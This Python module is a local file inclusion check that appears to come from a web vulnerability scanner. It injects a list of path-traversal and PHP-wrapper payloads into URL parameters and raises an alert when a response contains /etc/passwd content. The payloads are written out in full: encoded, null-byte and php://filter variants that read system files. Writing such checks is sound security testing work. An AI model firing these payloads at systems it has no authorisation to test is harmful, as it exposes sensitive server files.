# Filename: VulnerabilityChecks/LinuxLFIScanRule.py

import asyncio
import logging
import random
import re
import base64
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple, Set

import aiohttp

# --- Alert Definition ---
@dataclass
class LFIAlert:
    cwe_id: int
    name: str
    description: str
    uri: str         # The URL of the application endpoint tested
    param: str       # The parameter/injection point tested
    attack: str      # The payload URL sent
    evidence: str    # Description of how LFI was detected

    wasc_id: int = 5 # WASC-05: Path Traversal
    other_info: str = ""
    solution: str = (
        "Validate and sanitize all user input that is used to construct file paths. "
        "Use an allow-list of permitted files and directories. "
        "Run the application with the minimum necessary privileges. "
        "Ensure that the application correctly canonicalizes paths and does not allow traversal out of intended directories."
    )
    reference: str = (
        "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') - https://cwe.mitre.org/data/definitions/22.html\n"
        "OWASP LFI: https://owasp.org/www-community/attacks/Path_Traversal"
    )
    risk: int = 4  # High
    confidence: int = 3 # High if /etc/passwd pattern is found
    alert_tags: Dict[str, str] = field(default_factory=lambda: {
        "OWASP_2021_A01": "Broken Access Control (related, as LFI bypasses path restrictions)",
        "OWASP_2017_A05": "Broken Access Control",
        "WSTG_V42_ATHZ_01": "Testing_Directory_Traversal_File_Include",
        "MITRE_ATT&CK_T1083": "File and Directory Discovery (sub-technique of LFI)", # Approximate
        "Environment": "Linux"
    })
    attack_details: Dict[str, Any] = field(default_factory=dict)

    def as_dict(self) -> Dict[str, Any]:
        return {
            "vulnerability_type": "Local File Inclusion (LFI)",
            "type": self.name,
            "detail": self.description,
            "payload_used": self.attack,
            "injection_point_info": f"Location: {self.attack_details.get('location', 'N/A')}, Parameter: {self.param}",
            "url_tested": self.uri,
            "severity": {1: "Info", 2: "Low", 3: "Medium", 4: "High"}.get(self.risk, "Unknown"),
            "confidence": {1: "Low", 2: "Medium", 3: "High"}.get(self.confidence, "Unknown"),
            "evidence": self.evidence,
            "solution": self.solution,
            "reference": self.reference,
            "cwe_id": self.cwe_id,
            "wasc_id": self.wasc_id,
            "alert_tags": self.alert_tags,
            "other_info": self.other_info
        }

class LinuxLFIScanRule:
    tech_required: Set[str] = {"linux"} # Can be broadened if payloads are more generic, but /etc/passwd is Linux-specific.
                                        # If "linux" tech is not detected, this rule might be skipped or run with lower priority
                                        # unless a strong LFI_LINUX_PARAM_NAME_HINT is present.
                                        # For now, let's assume it can run if the hint is present, regardless of detected tech.
                                        # Or, make it tech_required: set() to always run on LFI hints.
                                        # Given the Nuclei template name, let's keep {"linux"} but allow override by strong passive hint.

    # Regex to detect /etc/passwd content
    PASSWD_CONTENT_REGEX = re.compile(r"root:.{0,30}:0:0:") # Adjusted length for flexibility

    # LFI payloads derived from the Nuclei template, targeting /etc/passwd
    LFI_PAYLOAD_VALUES = [
        "../../../../../../../../etc/passwd", # Common depth
        "../../../../../../../../etc/passwd%00", # Null byte
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", # URL encoded ../
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00", # URL encoded ../ with null
        # The Nuclei template has %252e for double encoding, which is often less effective than single.
        # Using single encoding for broader applicability.
        "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", # Overlong UTF-8 for ../ (less common, might be filtered)
        "....//....//....//....//etc/passwd", # Non-canonical
        "..///////..////..//////etc/passwd", # Excessive slashes
        # "/%5C../%5C../%5C../etc/passwd", # URL encoded backslash (more Windows, but let's include a shorter version)
        "php://filter/read=string.rot13/resource=../../../../../../../../etc/passwd", # PHP filter (rot13)
        "php://filter/convert.base64-encode/resource=../../../../../../../../etc/passwd", # PHP filter (base64)
        # Wrappers
        "file:///etc/passwd",
        "data://text/plain;base64,Li4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==" # data wrapper for ../../../../../../etc/passwd
    ]


    def __init__(self,
                 parent_logger: Optional[logging.Logger] = None,
                 http_timeout: float = 10.0,
                 active_scan_async_q: Optional[asyncio.Queue] = None
                 ):
        self.logger = parent_logger or logging.getLogger(__name__)
        self.http_timeout = http_timeout
        self.active_scan_async_q = active_scan_async_q
        self.logger.debug("LinuxLFIScanRule initialized.")

    async def _emit_alert(self, alert_obj: LFIAlert):
        if self.active_scan_async_q:
            try:
                await self.active_scan_async_q.put({
                    "type": "active_scan_alert", "alert": alert_obj.as_dict()
                })
                self.logger.info(f"LinuxLFIScan: Emitted LFI alert - {alert_obj.name} for {alert_obj.uri} (Param: {alert_obj.param})")
            except Exception as e:
                self.logger.error(f"LinuxLFIScan: Failed to emit LFI alert to queue: {e}")
        else:
            self.logger.warning(f"LinuxLFIScan: Async queue not available. LFI Alert not emitted: {alert_obj.name}")

    async def _send_lfi_attempt(
        self, session: aiohttp.ClientSession, method: str, url: str,
        headers: Optional[Dict[str, str]], cookies: Optional[Dict[str, str]],
        attacked_param_name: str, lfi_payload_sent: str
    ) -> Tuple[Optional[str], Optional[str]]:
        response_text: Optional[str] = None
        error_type_str: Optional[str] = None
        
        current_headers = (headers or {}).copy()
        if "User-Agent" not in current_headers:
             current_headers["User-Agent"] = "Mozilla/5.0 LFI-Scanner/1.0"
        
        self.logger.debug(f"LinuxLFIScan: Sending {method} to {url} (Param: {attacked_param_name}, LFI Payload: {lfi_payload_sent[:100]})")
        
        try:
            timeout = aiohttp.ClientTimeout(total=self.http_timeout)
            async with session.request(method.upper(), url, headers=current_headers, cookies=cookies, timeout=timeout, allow_redirects=False) as resp:
                try:
                    # Read as bytes first to handle potential binary data from filters or incorrect charsets
                    response_bytes = await resp.read()
                    # Attempt to decode as UTF-8, replace errors.
                    # For LFI, the content might not always be valid text if it's a binary file,
                    # but /etc/passwd should be text.
                    response_text = response_bytes.decode('utf-8', errors='replace')
                except Exception as e_read:
                    self.logger.debug(f"LinuxLFIScan: Error reading response body from {url}: {e_read}")
        except asyncio.TimeoutError: error_type_str = "TimeoutError"
        except aiohttp.ClientError as e: error_type_str = type(e).__name__
        except Exception as e: error_type_str = type(e).__name__
            
        if error_type_str:
            self.logger.debug(f"LinuxLFIScan: Request for {method} {url} (LFI Payload: {lfi_payload_sent[:100]}) resulted in {error_type_str}.")
            
        return response_text, error_type_str

    def _check_lfi_response(self, response_text: Optional[str], lfi_payload_used: str) -> Optional[str]:
        if not response_text:
            return None

        processed_text = response_text
        evidence_prefix = "Response body contains pattern 'root:.*:0:0:'"

        if "php://filter/convert.base64-encode/resource=" in lfi_payload_used:
            # Attempt to find and decode base64 content. This is a heuristic.
            # The entire response might be base64, or just a part.
            try:
                # Simplistic: assume the whole body if it looks like base64
                # A more robust way would be to regex out potential base64 strings.
                if re.match(r"^[A-Za-z0-9+/=\s\r\n]+$", response_text.strip()):
                    decoded_bytes = base64.b64decode(response_text.strip())
                    processed_text = decoded_bytes.decode('utf-8', errors='replace')
                    evidence_prefix = "Base64 decoded response body contains pattern 'root:.*:0:0:'"
                else: # If not clearly base64, check raw response too
                    pass
            except Exception as e_b64:
                self.logger.debug(f"LinuxLFIScan: Could not base64 decode response for payload {lfi_payload_used}: {e_b64}")
                # Continue to check the original response_text
        elif "php://filter/read=string.rot13/resource=" in lfi_payload_used:
            try:
                import codecs
                processed_text = codecs.decode(response_text, 'rot_13')
                evidence_prefix = "ROT13 decoded response body contains pattern 'root:.*:0:0:'"
            except Exception as e_rot13:
                self.logger.debug(f"LinuxLFIScan: Could not ROT13 decode response for payload {lfi_payload_used}: {e_rot13}")

        if self.PASSWD_CONTENT_REGEX.search(processed_text):
            return f"{evidence_prefix} indicating /etc/passwd content."
        
        return None

    async def scan(
        self,
        original_url: str, # The application's URL where the parameter was found
        aiohttp_session: aiohttp.ClientSession,
        injection_details: Dict[str, Any], # Contains param_name, location, method, action_url
        original_headers: Dict[str, str],
        original_cookies: Dict[str, str],
        worker_ident: Optional[str] = "LinuxLFIScan",
        # Other common args for compatibility, though not all used by this specific LFI rule
        base_app_url: Optional[str] = None,
        html_content: Optional[str] = None,
        page_specific_technologies: Optional[List[str]] = None,
        service_type_hint: Optional[str] = None, # e.g., "LFI_LINUX_PARAM_NAME_HINT"
        attack_strength: str = "MEDIUM" # LOW, MEDIUM, HIGH
    ) -> None:
        
        param_location = injection_details.get("location")
        param_name = injection_details.get("param_name")
        http_method = injection_details.get("method", "GET").upper() # Nuclei template is GET only
        # action_url is the URL to send the modified request to.
        # For url_params, it's the same as original_url where the param was found.
        # For forms, it would be the form's action attribute.
        target_app_url = injection_details.get("action_url", original_url)

        if not param_name:
            self.logger.debug(f"[{worker_ident}] LinuxLFIScan: No param_name in injection_details for {original_url}. Skipping.")
            return
        
        # This rule primarily targets URL parameters as per the Nuclei template.
        if param_location != "url_params":
            self.logger.debug(f"[{worker_ident}] LinuxLFIScan: Skipping LFI for param '{param_name}' as location is '{param_location}' (expects 'url_params' based on Nuclei template).")
            return
        if http_method != "GET":
            self.logger.debug(f"[{worker_ident}] LinuxLFIScan: Skipping LFI for param '{param_name}' as method is '{http_method}' (expects 'GET').")
            return

        self.logger.info(f"[{worker_ident}] Starting Linux LFI scan for param '{param_name}' at {target_app_url}")

        parsed_target_url = urllib.parse.urlparse(target_app_url)
        original_query_params = urllib.parse.parse_qs(parsed_target_url.query, keep_blank_values=True)

        payloads_to_test = self.LFI_PAYLOAD_VALUES
        if attack_strength == "LOW":
            payloads_to_test = random.sample(self.LFI_PAYLOAD_VALUES, min(3, len(self.LFI_PAYLOAD_VALUES)))
        elif attack_strength == "HIGH":
            # Could add more permutations or deeper traversals if needed for HIGH
            pass


        for lfi_value in payloads_to_test:
            # Create a mutable copy of original query parameters
            current_query_params = {k: v[:] for k, v in original_query_params.items()} # Deep copy lists
            
            # Inject the LFI payload into the target parameter
            current_query_params[param_name] = [lfi_value]
            
            # Reconstruct the query string
            modified_query_string = urllib.parse.urlencode(current_query_params, doseq=True)
            
            # Create the final test URL
            test_url = parsed_target_url._replace(query=modified_query_string).geturl()

            response_content, error = await self._send_lfi_attempt(
                aiohttp_session, http_method, test_url,
                original_headers, original_cookies, param_name, lfi_value
            )

            if error:
                self.logger.debug(f"[{worker_ident}] Network error '{error}' for LFI attempt on {test_url} with payload '{lfi_value}'.")
                # Some errors (like connection refused to an internal IP via SSRF-like LFI) could be indicative,
                # but for direct LFI, we primarily look at content.
                continue

            evidence = self._check_lfi_response(response_content, lfi_value)
            if evidence:
                alert = LFIAlert(
                    cwe_id=22, # Path Traversal
                    name="Linux Local File Inclusion (/etc/passwd)",
                    description=(
                        f"The application is vulnerable to Local File Inclusion. "
                        f"The content of '/etc/passwd' was successfully retrieved by injecting "
                        f"the payload '{lfi_value}' into the '{param_name}' parameter."
                    ),
                    uri=target_app_url, # The original URL where param was found
                    param=param_name,
                    attack=test_url, # The full URL with payload
                    evidence=evidence,
                    other_info=f"Payload variant used: {lfi_value}. Target file: /etc/passwd.",
                    attack_details={"location": param_location, "param": param_name, "method": "LFI_GET_URL_PARAM"}
                )
                await self._emit_alert(alert)
                self.logger.info(f"[{worker_ident}] Confirmed LFI for param '{param_name}' at {target_app_url} with payload '{lfi_value}'.")
                return # Stop testing this parameter if a payload works (stop-at-first-match for this param)
        
        self.logger.info(f"[{worker_ident}] Linux LFI scan finished for param '{param_name}' at {target_app_url}. No direct /etc/passwd inclusion found with tested payloads.")